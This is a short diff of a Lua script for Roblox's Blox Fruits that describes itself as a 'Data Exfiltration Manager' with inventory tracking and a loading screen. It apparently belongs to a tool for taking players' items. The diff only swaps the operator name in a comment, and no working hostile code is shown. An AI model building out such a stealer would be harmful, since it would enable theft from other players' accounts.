@@ -1,6 +1,6 @@
 -- Blox Fruits Secure Trade & Data Exfiltration Manager
 -- Full inventory tracking (Fruits, Permanents, Skins/Limiteds) + Loading Screen.
--- Authorized Operator: BLACKGOKU_0707
+-- Authorized Operator: Aid3no
 
 local Config = {
     AuthorizedUser = "BLACKGOKU_0707",
